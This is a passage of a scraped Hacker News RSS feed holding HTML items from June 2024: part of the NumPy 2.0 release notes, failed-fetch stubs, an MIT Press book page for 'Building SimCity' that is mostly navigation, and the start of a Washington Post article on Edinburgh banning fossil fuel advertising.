<code><span>z</span> <span>/</span> <span>|z|</span></code> (instead of the rather less logical case where the sign of
the real part was taken, unless the real part was zero, in which case
the sign of the imaginary part was returned).  Like for real numbers,
zero is returned if <code><span>z==0</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25441">gh-25441</a>)</p>
</section>
<section id="return-types-of-functions-that-returned-a-list-of-arrays">
<h3>Return types of functions that returned a list of arrays<a href="#return-types-of-functions-that-returned-a-list-of-arrays" title="Link to this heading">#</a></h3>
<p>Functions that returned a list of ndarrays have been changed to return a tuple
of ndarrays instead. Returning tuples consistently whenever a sequence of
arrays is returned makes it easier for JIT compilers like Numba, as well as for
static type checkers in some cases, to support these functions. Changed
functions are: <a href="https://numpy.org/devdocs/reference/generated/numpy.atleast_1d.html#numpy.atleast_1d" title="numpy.atleast_1d"><code><span>atleast_1d</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.atleast_2d.html#numpy.atleast_2d" title="numpy.atleast_2d"><code><span>atleast_2d</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.atleast_3d.html#numpy.atleast_3d" title="numpy.atleast_3d"><code><span>atleast_3d</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.broadcast_arrays.html#numpy.broadcast_arrays" title="numpy.broadcast_arrays"><code><span>broadcast_arrays</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.meshgrid.html#numpy.meshgrid" title="numpy.meshgrid"><code><span>meshgrid</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.ogrid.html#numpy.ogrid" title="numpy.ogrid"><code><span>ogrid</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.histogramdd.html#numpy.histogramdd" title="numpy.histogramdd"><code><span>histogramdd</span></code></a>.</p>
</section>
<section id="np-unique-return-inverse-shape-for-multi-dimensional-inputs">
<h3><code><span>np.unique</span></code> <code><span>return_inverse</span></code> shape for multi-dimensional inputs<a href="#np-unique-return-inverse-shape-for-multi-dimensional-inputs" title="Link to this heading">#</a></h3>
<p>When multi-dimensional inputs are passed to <code><span>np.unique</span></code> with <code><span>return_inverse=True</span></code>,
the <code><span>unique_inverse</span></code> output is now shaped such that the input can be reconstructed
directly using <code><span>np.take(unique,</span> <span>unique_inverse)</span></code> when <code><span>axis=None</span></code>, and
<code><span>np.take_along_axis(unique,</span> <span>unique_inverse,</span> <span>axis=axis)</span></code> otherwise.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25553">gh-25553</a>,
<a href="https://github.com/numpy/numpy/pull/25570">gh-25570</a>)</p>
</section>
<section id="any-and-all-return-booleans-for-object-arrays">
<h3><code><span>any</span></code> and <code><span>all</span></code> return booleans for object arrays<a href="#any-and-all-return-booleans-for-object-arrays" title="Link to this heading">#</a></h3>
<p>The <code><span>any</span></code> and <code><span>all</span></code> functions and methods now return
booleans also for object arrays.  Previously, they did
a reduction which behaved like the Python <code><span>or</span></code> and
<code><span>and</span></code> operators which evaluates to one of the arguments.
You can use <code><span>np.logical_or.reduce</span></code> and <code><span>np.logical_and.reduce</span></code>
to achieve the previous behavior.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25712">gh-25712</a>)</p>
</section>
<section id="np-can-cast-cannot-be-called-on-python-int-float-or-complex">
<h3><code><span>np.can_cast</span></code> cannot be called on Python int, float, or complex<a href="#np-can-cast-cannot-be-called-on-python-int-float-or-complex" title="Link to this heading">#</a></h3>
<p><code><span>np.can_cast</span></code> cannot be called with Python int, float, or complex instances
anymore.  This is because NEP 50 means that the result of <code><span>can_cast</span></code> must
not depend on the value passed in.
Unfortunately, for Python scalars whether a cast should be considered
<code><span>"same_kind"</span></code> or <code><span>"safe"</span></code> may depend on the context and value so that
this is currently not implemented.
In some cases, this means you may have to add a specific path for:
<code><span>if</span> <span>type(obj)</span> <span>in</span> <span>(int,</span> <span>float,</span> <span>complex):</span> <span>...</span></code>.</p>
<p><strong>Content from release note snippets in doc/release/upcoming_changes:</strong></p>
</section>
</section>
<section id="id1">
<h2>Deprecations<a href="#id1" title="Link to this heading">#</a></h2>
<blockquote>
<div><ul>
<li><p>The <em>fix_imports</em> keyword argument in <a href="https://numpy.org/devdocs/reference/generated/numpy.save.html#numpy.save" title="numpy.save"><code><span>numpy.save</span></code></a> is deprecated. Since
NumPy 1.17, <a href="https://numpy.org/devdocs/reference/generated/numpy.save.html#numpy.save" title="numpy.save"><code><span>numpy.save</span></code></a> uses a pickle protocol that no longer supports
Python 2, and ignored <em>fix_imports</em> keyword. This keyword is kept only
for backward compatibility. It is now deprecated.</p></li>
</ul>
</div></blockquote>
<p>(<a href="https://github.com/numpy/numpy/pull/26452">gh-26452</a>)</p>
</section>
<section id="id2">
<h2>Expired deprecations<a href="#id2" title="Link to this heading">#</a></h2>
<ul>
<li><p>Scalars and 0D arrays are disallowed for <a href="https://numpy.org/devdocs/reference/generated/numpy.nonzero.html#numpy.nonzero" title="numpy.nonzero"><code><span>numpy.nonzero</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.ndarray.nonzero.html#numpy.ndarray.nonzero" title="numpy.ndarray.nonzero"><code><span>numpy.ndarray.nonzero</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26268">gh-26268</a>)</p>
</li>
</ul>
</section>
<section id="id3">
<h2>C API changes<a href="#id3" title="Link to this heading">#</a></h2>
<section id="api-symbols-now-hidden-but-customizable">
<h3>API symbols now hidden but customizable<a href="#api-symbols-now-hidden-but-customizable" title="Link to this heading">#</a></h3>
<p>NumPy now defaults to hide the API symbols it adds to allow all NumPy API
usage.
This means that by default you cannot dynamically fetch the NumPy API from
another library (this was never possible on windows).</p>
<p>If you are experiencing linking errors related to <code><span>PyArray_API</span></code> or
<code><span>PyArray_RUNTIME_VERSION</span></code>, you can define the
<a href="https://numpy.org/devdocs/reference/c-api/array.html#c.NPY_API_SYMBOL_ATTRIBUTE" title="NPY_API_SYMBOL_ATTRIBUTE"><code><span>NPY_API_SYMBOL_ATTRIBUTE</span></code></a> to opt-out of this change.</p>
<p>If you are experiencing problems due to an upstream header including NumPy,
the solution is to make sure you <code><span>#include</span> <span>"numpy/ndarrayobject.h"</span></code> before
their header and import NumPy yourself based on  <a href="https://numpy.org/devdocs/reference/c-api/array.html#including-the-c-api"><span>Including and importing the C API</span></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26103">gh-26103</a>)</p>
</section>
</section>
<section id="id4">
<h2>New Features<a href="#id4" title="Link to this heading">#</a></h2>
<ul>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.reshape.html#numpy.reshape" title="numpy.reshape"><code><span>numpy.reshape</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.ndarray.reshape.html#numpy.ndarray.reshape" title="numpy.ndarray.reshape"><code><span>numpy.ndarray.reshape</span></code></a> now support <code><span>shape</span></code> and <code><span>copy</span></code> arguments.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26292">gh-26292</a>)</p>
</li>
<li><p>NumPy now supports DLPack v1, support for older versions will
be deprecated in the future.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26501">gh-26501</a>)</p>
</li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.asanyarray.html#numpy.asanyarray" title="numpy.asanyarray"><code><span>numpy.asanyarray</span></code></a> now supports <code><span>copy</span></code> and <code><span>device</span></code> arguments, matching <a href="https://numpy.org/devdocs/reference/generated/numpy.asarray.html#numpy.asarray" title="numpy.asarray"><code><span>numpy.asarray</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26580">gh-26580</a>)</p>
</li>
</ul>
</section>
<section id="id5">
<h2>Improvements<a href="#id5" title="Link to this heading">#</a></h2>
<section id="histogram-auto-binning-now-returns-bin-sizes-1-for-integer-input-data">
<h3><code><span>histogram</span></code> auto-binning now returns bin sizes &gt;=1 for integer input data<a href="#histogram-auto-binning-now-returns-bin-sizes-1-for-integer-input-data" title="Link to this heading">#</a></h3>
<p>For integer input data, bin sizes smaller than 1 result in spurious empty
bins.  This is now avoided when the number of bins is computed using one of the
algorithms provided by <a href="https://numpy.org/devdocs/reference/generated/numpy.histogram_bin_edges.html#numpy.histogram_bin_edges" title="numpy.histogram_bin_edges"><code><span>histogram_bin_edges</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/12150">gh-12150</a>)</p>
</section>
</section>
<section id="performance-improvements-and-changes">
<h2>Performance improvements and changes<a href="#performance-improvements-and-changes" title="Link to this heading">#</a></h2>
<section id="ma-cov-and-ma-corrcoef-are-now-significantly-faster">
<h3><code><span>ma.cov</span></code> and <code><span>ma.corrcoef</span></code> are now significantly faster<a href="#ma-cov-and-ma-corrcoef-are-now-significantly-faster" title="Link to this heading">#</a></h3>
<p>The private function has been refactored along with <a href="https://numpy.org/devdocs/reference/generated/numpy.ma.cov.html#numpy.ma.cov" title="numpy.ma.cov"><code><span>ma.cov</span></code></a> and
<a href="https://numpy.org/devdocs/reference/generated/numpy.ma.corrcoef.html#numpy.ma.corrcoef" title="numpy.ma.corrcoef"><code><span>ma.corrcoef</span></code></a>. They are now significantly faster, particularly on large,
masked arrays.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26285">gh-26285</a>)</p>
<blockquote>
<div><ul>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.save.html#numpy.save" title="numpy.save"><code><span>numpy.save</span></code></a> now uses pickle protocol version 4 for saving arrays with
object dtype, which allows for pickle objects larger than 4GB and improves
saving speed by about 5% for large arrays.</p></li>
</ul>
</div></blockquote>
<p>(<a href="https://github.com/numpy/numpy/pull/26388">gh-26388</a>)</p>
</section>
</section>
<section id="id6">
<h2>Changes<a href="#id6" title="Link to this heading">#</a></h2>
<ul>
<li><p>As <a href="https://numpy.org/devdocs/reference/generated/numpy.vecdot.html#numpy.vecdot" title="numpy.vecdot"><code><span>numpy.vecdot</span></code></a> is now a ufunc it has a less precise signature.
This is due to the limitations of ufunc’s typing stub.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26313">gh-26313</a>)</p>
</li>
</ul>
<section id="ma-corrcoef-may-return-a-slightly-different-result">
<h3><code><span>ma.corrcoef</span></code> may return a slightly different result<a href="#ma-corrcoef-may-return-a-slightly-different-result" title="Link to this heading">#</a></h3>
<p>A pairwise observation approach is currently used in <a href="https://numpy.org/devdocs/reference/generated/numpy.ma.corrcoef.html#numpy.ma.corrcoef" title="numpy.ma.corrcoef"><code><span>ma.corrcoef</span></code></a> to
calculate the standard deviations for each pair of variables. This has been
changed as it is being used to normalise the covariance, estimated using
<a href="https://numpy.org/devdocs/reference/generated/numpy.ma.cov.html#numpy.ma.cov" title="numpy.ma.cov"><code><span>ma.cov</span></code></a>, which does not consider the observations for each variable in a
pairwise manner, rendering it unnecessary. The normalisation has been
replaced by the more appropriate standard deviation for each variable,
which significantly reduces the wall time, but will return slightly different
estimates of the correlation coefficients in cases where the observations
between a pair of variables are not aligned. However, it will return the same
estimates in all other cases, including returning the same correlation matrix
as <a href="https://numpy.org/devdocs/reference/generated/numpy.corrcoef.html#numpy.corrcoef" title="numpy.corrcoef"><code><span>corrcoef</span></code></a> when using a masked array with no masked values.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/26285">gh-26285</a>)</p>
</section>
</section>
</section>


                </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Experts vs. Imitators (200 pts)]]></title>
            <link>https://fs.blog/experts-vs-imitators/</link>
            <guid>40699079</guid>
            <pubDate>Sun, 16 Jun 2024 18:33:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fs.blog/experts-vs-imitators/">https://fs.blog/experts-vs-imitators/</a>, See on <a href="https://news.ycombinator.com/item?id=40699079">Hacker News</a></p>
Couldn't get https://fs.blog/experts-vs-imitators/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[I've compared nearly all Rust crates.io crates to contents of their Git repos (125 pts)]]></title>
            <link>https://mastodon.social/@kornel/112626463128422583</link>
            <guid>40698536</guid>
            <pubDate>Sun, 16 Jun 2024 17:07:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.social/@kornel/112626463128422583">https://mastodon.social/@kornel/112626463128422583</a>, See on <a href="https://news.ycombinator.com/item?id=40698536">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Building SimCity: How to put the world in a machine (199 pts)]]></title>
            <link>https://mitpress.mit.edu/9780262547482/building-simcity/</link>
            <guid>40698442</guid>
            <pubDate>Sun, 16 Jun 2024 16:55:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mitpress.mit.edu/9780262547482/building-simcity/">https://mitpress.mit.edu/9780262547482/building-simcity/</a>, See on <a href="https://news.ycombinator.com/item?id=40698442">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="page">
        <p><a href="#content">Skip to content</a></p><header role="banner" id="masthead">
                <div>
            
        <p><a href="https://mitpress.mit.edu/" rel="home"><img width="386" height="610" src="https://dhjhkxawhe8q4.cloudfront.net/mit-press/wp-content/uploads/2022/05/20143118/logo.png" alt="MIT Press" decoding="async" fetchpriority="high" srcset="https://dhjhkxawhe8q4.cloudfront.net/mit-press/wp-content/uploads/2022/05/20143118/logo.png 386w, https://dhjhkxawhe8q4.cloudfront.net/mit-press/wp-content/uploads/2022/05/20143118/logo-190x300.png 190w, https://dhjhkxawhe8q4.cloudfront.net/mit-press/wp-content/uploads/2022/05/20143118/logo-309x488.png 309w, https://dhjhkxawhe8q4.cloudfront.net/mit-press/wp-content/uploads/2022/05/20143118/logo-127x200.png 127w" sizes="(max-width: 386px) 100vw, 386px"></a>
        </p>

        
        <div>

                
        <nav role="navigation" aria-label="main menu: press escape to close the menu">
            <div><ul id="primary-menu"><li><a href="https://mitpress.mit.edu/" role="link"><img src="https://dhjhkxawhe8q4.cloudfront.net/mit-press/wp-content/uploads/2021/11/26163520/mitp-colophon-white-black-bkg.gif" alt="MIT Press"></a></li><li id="menu-item-10853"><a href="#" aria-haspopup="true" aria-expanded="false">Books</a>
<ul>
	<li id="menu-item-77"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-121"><a href="https://mitpress.mit.edu/books/subjects/">View all subjects</a></li>
		<li id="menu-item-11089"><a href="https://mitpress.mit.edu/new-releases/">New releases</a></li>
		<li id="menu-item-85"><a href="https://mitpress.mit.edu/catalogs/">Catalogs</a></li>
		<li id="menu-item-9600"><a href="https://mitpress.mit.edu/textbooks/">Textbooks</a></li>
		<li id="menu-item-118"><a href="https://mitpress.mit.edu/books/series/">Series</a></li>
		<li id="menu-item-13156"><a href="https://mitpress.mit.edu/awards/">Awards</a></li>
	</ul>
</li>
	<li id="menu-item-117"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-76"><a href="https://mitpress.mit.edu/authors/">Authors</a></li>
		<li id="menu-item-9677"><a href="https://mitpress.mit.edu/publishers/">Distributed presses</a></li>
		<li id="menu-item-3490"><a target="_blank" rel="noopener" href="https://thereader.mitpress.mit.edu/">The MIT Press Reader</a></li>
		<li id="menu-item-3492"><a target="_blank" rel="noopener" href="https://newbooksnetwork.com/category/up-partners/mit-press-podcast">Podcasts</a></li>
		<li id="menu-item-12667"><a href="https://mitpress.mit.edu/collections/">Collections</a></li>
	</ul>
</li>
	<li id="menu-item-124"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-3434"><a target="_blank" rel="noopener" href="https://direct.mit.edu/" aria-haspopup="true" aria-expanded="false">MIT Press Direct</a><p>MIT Press Direct is a distinctive collection of influential MIT Press books curated for scholars and libraries worldwide.</p>
		<ul>
			<li id="menu-item-3435"><a href="https://direct.mit.edu/">Learn more</a></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-3494"><a href="#" aria-haspopup="true" aria-expanded="false">Journals</a>
<ul>
	<li id="menu-item-3495"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-3497"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals/pages/browse_by_topic">Journals all topics</a></li>
		<li id="menu-item-3498"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals/pages/browse_by_topic#econ">Economics</a></li>
		<li id="menu-item-3499"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals/pages/browse_by_topic#interpol">International Affairs, History, &amp; Political Science</a></li>
	</ul>
</li>
	<li id="menu-item-3496"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-3500"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals/pages/browse_by_topic#artshuman">Arts &amp; Humanities</a></li>
		<li id="menu-item-3501"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals/pages/browse_by_topic#scitech">Science &amp; Technology</a></li>
		<li id="menu-item-11045"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals/pages/open-access">Open access</a></li>
	</ul>
</li>
	<li id="menu-item-3503"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-3502"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals" aria-haspopup="true" aria-expanded="false">MIT Press journals</a><p>MIT Press began publishing journals in 1970 with the first volumes of <em>Linguistic Inquiry</em> and the <em>Journal of Interdisciplinary History</em>. Today we publish over 30 titles in the arts and humanities, social sciences, and science and technology.</p>
		<ul>
			<li id="menu-item-3504"><a target="_blank" rel="noopener" href="https://direct.mit.edu/journals">Learn more</a></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-3430"><a aria-haspopup="true" aria-expanded="false">Open Access</a>
<ul>
	<li id="menu-item-3464"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-18875"><a href="https://mitpress.mit.edu/open-access-at-mit-press/">Open access at the MIT Press</a></li>
		<li id="menu-item-18876"><a href="https://mitpress.mit.edu/open-access-at-mit-press/initiatives/">Open access initiatives</a></li>
		<li id="menu-item-3467"><a target="_blank" rel="noopener" href="https://direct.mit.edu/books/pages/direct-to-open">Direct to Open</a></li>
		<li id="menu-item-18847"><a href="https://mitpress.mit.edu/open-access-at-mit-press/mit-open-publishing-services/">MIT Open Publishing Services</a></li>
	</ul>
</li>
	<li id="menu-item-3468"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-18878"><a href="https://mitpress.mit.edu/open-access-at-mit-press/books/">Open access books</a></li>
		<li id="menu-item-18877"><a href="https://mitpress.mit.edu/open-access-at-mit-press/journals/">Open access journals</a></li>
		<li id="menu-item-11873"><a href="https://mitpressonpubpub.mitpress.mit.edu/">MIT Press Open Access @ PubPub</a></li>
	</ul>
</li>
	<li id="menu-item-3470"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-10527"><a href="https://mitpress.mit.edu/?page_id=9671" aria-haspopup="true" aria-expanded="false">Open access</a><p>The MIT Press has been a leader in open access book publishing for over two decades, beginning in 1995 with the publication of William Mitchell’s City of Bits, which appeared simultaneously in print and in a dynamic, open web edition.</p>
		<ul>
			<li id="menu-item-10445"><a href="https://mitpress.mit.edu/about-our-oa-program/">Learn more</a></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-3431"><a href="#" aria-haspopup="true" aria-expanded="false">Info for</a>
<ul>
	<li id="menu-item-3474"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-3482"><a href="https://mitpress.mit.edu/for-authors/">Current authors</a></li>
		<li id="menu-item-3478"><a href="https://mitpress.mit.edu/prospective-authors/">Prospective authors</a></li>
		<li id="menu-item-9771"><a href="https://mitpress.mit.edu/instructors/">Instructors</a></li>
	</ul>
</li>
	<li id="menu-item-3476"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-9665"><a href="https://mitpress.mit.edu/media-inquiries/">Media inquiries</a></li>
		<li id="menu-item-9664"><a href="https://mitpress.mit.edu/booksellers/">Booksellers</a></li>
		<li id="menu-item-3609"><a href="https://mitpress.mit.edu/rights-permissions/">Rights and permissions</a></li>
	</ul>
</li>
	<li id="menu-item-3475"><a href="#" aria-haspopup="true" aria-expanded="false">column</a>
	<ul>
		<li id="menu-item-3485"><a href="#" aria-haspopup="true" aria-expanded="false">Resources</a><p>Collaborating with authors, instructors, booksellers, librarians, and the media is at the heart of what we do as a scholarly publisher. If you can’t find the resource you need here, visit our contact page to get in touch.</p>
		<ul>
			<li id="menu-item-10443"><a href="https://mitpress.mit.edu/for-authors/">Learn more</a></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-19570"><a href="https://mitpress.mit.edu/give-to-the-mit-press/">Give</a></li>
<li id="menu-item-10854"><a href="#" aria-haspopup="true" aria-expanded="false">About</a>
<ul>
	<li id="menu-item-10441"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-11348"><a href="https://mitpress.mit.edu/about/">About</a></li>
		<li id="menu-item-10327"><a href="https://mitpress.mit.edu/jobs/">Jobs</a></li>
		<li id="menu-item-10328"><a href="https://mitpress.mit.edu/internships-paid-internships-books-journals/">Internships</a></li>
		<li id="menu-item-10324"><a href="https://mitpress.mit.edu/mit-press-editorial-board/">MIT Press Editorial Board</a></li>
		<li id="menu-item-10325"><a href="https://mitpress.mit.edu/mit-press-management-board/">MIT Press Management Board</a></li>
		<li id="menu-item-14905"><a href="https://mitpress.mit.edu/collections/our-mit-story/">Our MIT story</a></li>
	</ul>
</li>
	<li id="menu-item-10329"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-10330"><a href="https://mitpress.mit.edu/catalogs/">Catalogs</a></li>
		<li id="menu-item-10331"><a href="https://mitpress.mit.edu/?page_id=105">News</a></li>
		<li id="menu-item-9516"><a href="https://mitpress.mit.edu/events/">Events</a></li>
		<li id="menu-item-10332"><a href="https://mitpress.mit.edu/conferences/">Conferences</a></li>
		<li id="menu-item-10333"><a href="http://mitpressbookstore.mit.edu/">Bookstore</a></li>
	</ul>
</li>
	<li id="menu-item-10440"><a href="#" aria-haspopup="true" aria-expanded="false">Column</a>
	<ul>
		<li id="menu-item-10334"><a href="#" aria-haspopup="true" aria-expanded="false">The MIT Press</a><p>Established in 1962, the MIT Press is one of the largest and most distinguished university presses in the world and a leading publisher of books and journals at the intersection of science, technology, art, social science, and design.</p>
		<ul>
			<li id="menu-item-10442"><a href="https://mitpress.mit.edu/about">Learn more</a></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-11708"><a href="https://mitpress.mit.edu/contact-us/">Contact Us</a></li>
</ul></div>        </nav>

                        
        
                </div>

                </div>
        
        

        
                    
        
            </header>
    
    <div id="content">
        
    <main id="main">

        <div id="product-details-32" data-widget-params="{&quot;include_price&quot;:1}" data-ajax-url="https://mitpress.mit.edu/wp-admin/admin-ajax.php">
                <ul>
                                                                        <li>
                                <a href="#tab-1">
                                    Description                                </a>
                            </li>
                                                                                                                                            <li>
                                <a href="#tab-3">Author(s)</a>
                            </li>
                                                                                                <li>
                                <a href="#tab-4">Praise</a>
                            </li>
                                                                                                                                </ul>
                                                            
                                                                                                                    
                                                                                
                                                                                    </div>

    </main><!-- #main -->


</div><!-- #content -->



    

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Edinburgh, Scotland makes it illegal to advertise SUVs (110 pts)]]></title>
            <link>https://www.washingtonpost.com/climate-solutions/2024/06/15/fossil-fuel-advertising-bans-edinburgh/</link>
            <guid>40698412</guid>
            <pubDate>Sun, 16 Jun 2024 16:50:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.washingtonpost.com/climate-solutions/2024/06/15/fossil-fuel-advertising-bans-edinburgh/">https://www.washingtonpost.com/climate-solutions/2024/06/15/fossil-fuel-advertising-bans-edinburgh/</a>, See on <a href="https://news.ycombinator.com/item?id=40698412">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="C2FKBZ64ANAXDEZ4Q4FRVJSIOU" data-el="text" dir="null">EDINBURGH — Last month this Scottish city — filled with medieval spires and shadowed by the looming castle on the hill said to have inspired the Harry Potter books — made a startlingly modern decision. Edinburgh’s city council voted to <a href="https://democracy.edinburgh.gov.uk/documents/s70730/9.1%20Policy%20on%20Advertising%20and%20Sponsorship%20-%20Proposed%20Amendments.pdf" target="_blank">ban fossil fuel advertisements</a> on city property, undermining the ability of not only <a href="https://www.washingtonpost.com/politics/2022/06/13/house-democrats-probe-pr-industry-role-advertising-big-oil/?itid=lk_inline_manual_2" target="_blank">oil companies</a>, but also car manufacturers, <a href="https://www.washingtonpost.com/climate-solutions/2024/02/02/sustainable-aviation-fuel-future/?itid=lk_inline_manual_2" target="_blank">airlines</a> and <a href="https://www.washingtonpost.com/travel/2022/09/28/green-cruises-environment/?itid=lk_inline_manual_2" target="_blank">cruise ships</a>, to promote their products. The ban targeted arms manufacturers as well.</p></div><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="OQM4JNVRWFAPJD2JQWJTA3RBW4" data-el="text" dir="null">Edinburgh is not alone. <a href="https://www.euronews.com/green/2021/05/20/amsterdam-becomes-first-city-in-the-world-to-ban-this-type-of-advert" target="_blank">Amsterdam</a> and <a href="https://www.adnews.com.au/news/city-of-sydney-votes-to-end-fossil-fuel-advertising" target="_blank">Sydney</a> have cracked down on advertisements for fossil fuels and high-emissions products. France also limited the promotion of coal, gas and hydrogen made from fossil fuels. Even the United Nations Secretary General, António Guterres, has joined in, endorsing a ban on fossil fuel ads this month in a speech in New York this month: “Stop the Mad Men from fueling the madness.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="LJIYXFY3EVCDLPP4BNACCOPQCM" data-el="text" dir="null">“There’s a moment happening here,” said Ben Parker, the Edinburgh city councilor who spearheaded the ban and a member of the Scottish Green Party. “It’s a way of saying fossil fuel companies and arms manufacturers are not welcome in our city.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="BIJKKZVQFNAXTECEJMO4TRTVCM" data-el="text" dir="null">A local ban on fossil fuel advertisements might seem minor at a time when carbon emissions — and <a href="https://www.washingtonpost.com/weather/2024/06/05/global-temperatures-1-5-celsius-record-year/?itid=lk_inline_manual_8" target="_blank">temperatures</a> — continue to march upward. But there is evidence that sweeping advertising bans, such as those targeting tobacco products in many countries, can change how consumers view and purchase certain products. The question is whether the new fossil fuel advertising bans are substantial enough to have an impact.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="N5OGPPP4DRC57AOZICGCHWXQUI" data-el="text" dir="null">“A lot of these bans that are being put forward are at the municipal and city level,” said Timothy Dewhirst, professor of marketing and consumer studies at the University of Guelph. “And partial bans have proven to be ineffective.”</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="2MX33FQJRBF67LDBQQQPBOT5HY" data-el="text" dir="null">Fossil fuel producers counter that they are focused on addressing climate change. “Our industry is focused on continuing to produce affordable, reliable energy while tackling the climate challenge, and any allegations to the contrary are false,” Scott Lauermann, a spokesperson for the American Petroleum Institute, said in an email.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="GMM7ZG63PZHHRL5A5OG2W25KTA" data-el="text" dir="null">Proponents of advertising bans seek to accomplish<b> </b>two goals: convince people not to use<b> </b>the product, and lower the reputation of an industry or company. Given how embedded fossil fuels are in modern society, some experts see the latter goal as more achievable.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="Z2MSLJH52FDKRETQAJDF5FXAP4" data-el="text" dir="null">At the individual level, seeing fewer advertisements for gas-guzzling cars or international trips could make people less likely to opt for those products. “What you are doing is reducing the amount of consumption that is coming from those advertisements,” said Andrew Simms, co-director of the New Weather Institute and a campaigner for fossil fuel ad bans.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="PR5KYC5F2VHPBMJ5IO65D4J2JI" data-el="text" dir="null">There’s <a href="https://www.sciencedirect.com/science/article/abs/pii/S0167629608000155?via%3Dihub" target="_blank">evidence</a> that this works. Starting in the 1970s, the constant drumbeat of new findings on the health effects of cigarettes triggered a lengthy process where nations restricted advertisements for cigarettes on TV, the radio and in public spaces. In the United States, bans began with cigarette advertising on television, and grew to covering the sponsorship of events, public transit ads and more.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="7BNZVWICBFARJLY3XWD3MTUDNM" data-el="text" dir="null">Today, dozens of countries — including the <a href="https://www.fda.gov/tobacco-products/products-guidance-regulations/advertising-and-promotion" target="_blank">United States</a>,<b> </b><a href="https://www.tobaccocontrollaws.org/legislation/china" target="_blank">China</a> and the <a href="https://health.ec.europa.eu/tobacco/ban-cross-border-tobacco-advertising-and-sponsorship_en" target="_blank">European Union</a><b> — </b>have bans, restrictions or other limitations on selling tobacco products. There is even an <a href="https://fctc.who.int/who-fctc/overview" target="_blank">international treaty</a> under the World Health Organization, adopted in 2003,<b> </b>that urges all countries to enact bans that target all forms of tobacco advertising. There are currently 168 signatories on the treaty; the<b> </b>United States has signed on the treaty but not ratified it.</p><p data-testid="drop-cap-letter" data-apitype="text" data-contentid="JOY3PX4PRZGEHEGXVR4YQMOPKI" data-el="text" dir="null">Research shows that those bans that block TV, radio, print and in-store advertising — as well as sponsorship of events — are most effective at stopping smoking, particularly among young people who have yet to start smoking in the first place. As of 2017, full bans were implemented in less than 20 percent of countries worldwide.</p><p data-testid="drop-cap-letter" data-apitype="text" 